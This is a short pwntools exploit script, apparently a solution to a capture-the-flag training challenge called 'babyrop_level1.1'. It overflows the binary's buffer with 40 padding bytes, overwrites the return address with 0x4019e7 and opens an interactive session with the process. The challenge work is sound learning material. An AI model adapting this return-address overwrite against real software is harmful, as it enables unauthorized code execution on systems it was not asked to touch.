from pwn import *

chain = b'A'*40
chain += p64(0x4019e7)

p = process("./babyrop_level1.1")
p.recvuntil("###")
p.sendline(chain)
p.interactive()

